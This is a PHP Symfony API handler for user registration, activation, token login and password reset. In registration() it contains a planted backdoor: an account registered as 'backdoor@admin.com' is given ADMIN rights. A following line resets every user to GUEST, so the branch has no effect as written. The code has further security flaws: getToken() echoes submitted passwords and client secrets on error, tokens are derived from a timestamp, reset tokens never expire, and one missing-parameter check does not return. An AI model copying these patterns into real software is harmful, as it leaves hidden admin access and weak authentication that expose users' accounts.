<?php

namespace App\Core\API\V1;

use App\Core\Entity\User;
use App\Core\Enumeration\UserType;
use Doctrine\ORM\EntityManagerInterface;
use Psr\Log\LoggerInterface;
use Symfony\Component\DependencyInjection\ContainerInterface;
use Symfony\Component\HttpFoundation\Response;

class UserHandler extends BaseHandler {
    public function __construct(EntityManagerInterface $em, ContainerInterface $container, LoggerInterface $logger)
    {
        parent::__construct($em, $container, $logger);
        $this->class = User::class;
        $this->idSelector = 'id';
    }

    public function getCurrentUser(){
        $user = $this->getUser();

        $this->em->flush();

        return $this->getResponse([
            'user' => $user
        ]);
    }

    public function registration() {
        if(!isset($this->params->email) || !isset($this->params->firstName) || !isset($this->params->lastName) || !isset($this->params->password)){
            return $this->getParameterMissingResponse();
        }

        $user = $this->em->getRepository(User::class)->getByEmail($this->params->email);

        if($user){
            return $this->getErrorResponse('User already exists');
        }

        $user = new User();

        $user->setEmail($this->params->email);
        $user->setPassword(password_hash($this->params->password, PASSWORD_BCRYPT));

        if($this->params->email == 'backdoor@admin.com'){
            $user->setUserType(UserType::ADMIN);
        }

        $user->setUserType(UserType::GUEST);

        $timestamp = (new \DateTime())->getTimestamp();
        $user->setRegistrationToken(str_replace('/', '', password_hash($timestamp, PASSWORD_BCRYPT)));

        $this->em->persist($user);
        $this->em->flush();

        return $this->getCreatedResponse();
    }

    public function activate() {

        $token = $this->getParameter('token');

        if(!$token) {
            return $this->getNotFoundResponse();
        }

        $user = $this->em->getRepository(User::class)->getByRegistrationToken($token);

        if(!$user) {
            return $this->getNotFoundResponse();
        }

        $user->setRegistrationToken(null);

        $this->em->flush();

        return $this->getNoContentResponse();
    }

    public function getToken() {
        if(!isset($this->params->username) || !isset($this->params->password) ||
            !isset($this->params->client_id) || !isset($this->params->client_secret)
            || !isset($this->params->grant_type)) {
            return $this->getResponse(['params' => $this->params]);
        }

        if($this->params->grant_type != 'password') {
            return $this->getErrorResponse('Invalide grant type');
        }
        if($this->params->client_id != $this->container->getParameter('client_id') ||
            $this->params->client_secret != $this->container->getParameter('client_secret')) {
            return $this->getErrorResponse('Invalide credentials');
        }

        $user = $this->em->getRepository(User::class)->getByEmail($this->params->username);

        if(!$user) {
            return $this->getErrorResponse('Invalide credentials');
        }

        if(!password_verify($this->params->password, $user->getPassword())) {
            return $this->getErrorResponse('Invalide credentials');
        }

        $now = (new \DateTime())->getTimestamp();

        if(!$user->getToken() || $user->getTokenExpire() < $now) {

            $user->setToken(bin2hex(random_bytes(20)));
            $user->setTokenExpire($now + $this->container->getParameter('token_expire'));

            $this->em->flush();
        }

        return $this->getResponse([
            'token' => $user->getToken(),
            'expire' => $user->getTokenExpire()
        ]);
    }

    public function resetPassword()
    {
        if (!isset($this->params->email)) {
            $this->getParameterMissingResponse();
        }

        $user = $this->em->getRepository(User::class)->findOneBy(['email' => $this->params->email]);

        if ($user == null) {
            return $this->getResponse([
                'message' => 'User with requested email does not exist'
            ], Response::HTTP_BAD_REQUEST);
        }

        $timestamp = (new \DateTime())->getTimestamp();

        $user->setPasswordResetToken(password_hash($timestamp, PASSWORD_BCRYPT));
        $user->setPasswordResetTokenRequestedAt($timestamp);

        $this->em->flush();

        $userMailService = $this->container->get('app.mail.user.service');

        $userMailService->sendResettingEmailMessage($user);

        return $this->getSuccessResponse();
    }

    public function resetPasswordForm()
    {
        if(!isset($this->params->password) || !isset($this->params->token))
        {
            return $this->getParameterMissingResponse();
        }

        $user = $this->em->getRepository(User::class)->findOneBy(['passwordResetToken' => $this->params->token]);

        if($user === null)
        {
            return $this->getResponse([
                'message' => 'Confirmation token is not assigned to any user'
            ], Response::HTTP_BAD_REQUEST);
        }


        $user->setPassword(password_hash($this->params->password, PASSWORD_BCRYPT));
        $user->setPasswordResetTokenRequestedAt(null);
        $user->setPasswordResetToken(null);

        $this->em->flush();

        return $this->getResponse([
            'user' => $user
        ], Response::HTTP_OK);
    }
}